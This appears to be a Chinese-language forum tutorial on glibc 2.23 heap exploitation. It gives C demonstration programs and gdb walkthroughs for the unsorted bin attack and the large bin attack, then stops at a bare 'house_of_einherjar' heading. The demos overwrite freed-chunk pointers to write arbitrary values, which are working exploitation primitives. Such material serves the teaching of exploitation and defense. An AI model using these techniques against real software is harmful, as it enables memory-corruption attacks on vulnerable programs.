
# unsorted_bin_attack

```c
#include <stdio.h>

#include <stdlib.h>



int main(){



    fprintf(stderr, "unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n");

    fprintf(stderr, "实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n");



    unsigned long stack_var=0;

    fprintf(stderr, "我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n", &stack_var, stack_var);



    unsigned long *p=malloc(0x410);

    fprintf(stderr, "一开始先申请一个比较正常的 chunk: %p\n",p);

    fprintf(stderr, "再分配一个避免与 top chunk 合并\n\n");

    malloc(500);



    free(p);

    fprintf(stderr, "当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n",(void*)p[1]);



    p[1]=(unsigned long)(&stack_var-2);

    fprintf(stderr, "现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n");

    fprintf(stderr, "我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n",(void*)p[1]);



    malloc(0x410);

    fprintf(stderr, "再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n");

    fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);

}
```

`gcc -g unsorted_bin_attack.c`

分别在 10、13、16、19 下断点

然后运行，一开始先申请两个 chunk，第二个是为了防止与 top chunk 合并

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_KM6D677YG6CMB59.jpg "image.png")

当 `free()` 之后，这个 chunk 的 `fd`、`bk` 都指向了 unsorted bin 的位置，因为 unsorted bin 是双向链表嘛

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_G3XJTDABTHKDSC2.jpg "image.png")

继续，通过 `p[1] = (unsigned long)(&stack_var - 2);` 把 `bk` 指针给改掉了，`unsigned long` 是 8 字节大小的，所以减去 2 之后正好是在 address 这个地方

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_MUXVFDSS6PBCT3D.jpg "image.png")

然后再去申请的时候需要把释放的那一块给拿出来，操作如下：

```c
/* remove from unsorted list *///bck = chunk->bkunsorted_chunks (av)->bk = bck;bck->fd = unsorted_chunks (av);
```

把 unsorted bin 的 `bk` 改为 chunk 的 `bk`，然后将 chunk 的 `bk` 所指向的 `fd` 改为 unsorted bin 的地址

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_6MV3YHQWQQW8R2J.jpg "image.png")

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_4YWBXST25MJXRSA.jpg "image.png")

同时因为对于一个 chunk 来说 chunk 头是占据 `0x10` 大小的（也就是图中 address），所以 `fd` 正好是我们想要改的那个地址

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_33R9WAQNQEPSUME.jpg)

# large_bin_attack

ubuntu16.04 glibc 2.23

```c
#include<stdio.h>

#include<stdlib.h>

 

int main()

{

    fprintf(stderr, "根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n");



    unsigned long stack_var1 = 0;

    unsigned long stack_var2 = 0;



    fprintf(stderr, "先来看一下目标:\n");

    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);

    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);



    unsigned long *p1 = malloc(0x320);

    fprintf(stderr, "分配第一个 large chunk: %p\n", p1 - 2);



    fprintf(stderr, "再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n");

    malloc(0x20);



    unsigned long *p2 = malloc(0x400);

    fprintf(stderr, "申请第二个 large chunk 在: %p\n", p2 - 2);



    fprintf(stderr, "同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n");

    malloc(0x20);



    unsigned long *p3 = malloc(0x400);

    fprintf(stderr, "最后申请第三个 large chunk 在: %p\n", p3 - 2);

 

    fprintf(stderr, "申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n");

    malloc(0x20);

 

    free(p1);

    free(p2);

    fprintf(stderr, "free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));



    malloc(0x90);

    fprintf(stderr, "现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ %p ]\n\n", (void *)((char *)p1 + 0x90));



    free(p3);

    fprintf(stderr, "free 掉第三个，他会被放到 unsorted bin 中: [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));



    fprintf(stderr, "假设有个漏洞，可以覆盖掉第二个 chunk 的 \"size\" 以及 \"bk\"、\"bk_nextsize\" 指针\n");

    fprintf(stderr, "减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n");



    p2[-1] = 0x3f1;

    p2[0] = 0;

    p2[2] = 0;

    p2[1] = (unsigned long)(&stack_var1 - 2);

    p2[3] = (unsigned long)(&stack_var2 - 4);



    malloc(0x90);

    fprintf(stderr, "再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);

    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;

}
```

`gcc -g 1.c`

首先申请了几个 chunk

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_HB22YDC5JZVQ8CB.jpg "image.png")

接下来释放掉前两个

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_2MMSE7KMN9CXM4X.jpg "image.png")

接下来去申请一个 `0x90` 大小的，他会把前面那个 `0x320` 大小的切割

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_X2JG6ZK9Q56EZK7.jpg "image.png")

同时因为我们去申请了，他就会给 unsortedbin 中的 free chunk 进行整理划分，把那两块大的放到 largebin

接下来去修改 `p2`，之前：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_EKWH9PQPMTVK3XE.jpg "image.png")

之后：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_XTM4D2ERRXKP66A.jpg "image.png")

我们伪造的分别是 `p2` 的 `size`、`bk` 以及 `bk_nextsize`，接下来申请一个 chunk，这样的话 `p3` 就会被整理到 largebin

而 largebin 是按照从大到小排序的，所以需要进行排序，排序的操作大概是：

```c
//victim是p3、fwd是修改后的p2

{

    victim->fd_nextsize = fwd;//1

    victim->bk_nextsize = fwd->bk_nextsize;//2

    fwd->bk_nextsize = victim;//3

    victim->bk_nextsize->fd_nextsize = victim;//4

}

victim->bk = bck;

victim->fd = fwd;

fwd->bk = victim;

bck->fd = victim;
```

把 2 带入 4 得到：`fwd->bk_nextsize->fd_nextsize=victim`

同时下面有：`fwd->bk=victim`

也就是说之前我们伪造的 `p2` 的 `bk` 跟 `bk_nextsize` 指向的地址被改为了 `victim`

即 `(unsigned long)(&stack_var1 - 2)` 与 `(unsigned long)(&stack_var2 - 4)` 被改为了 `victim`

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_TWUQAHPX6KBZHP7.jpg "image.png")

# house_of_einherjar

ubuntu16.04 glibc 2.23
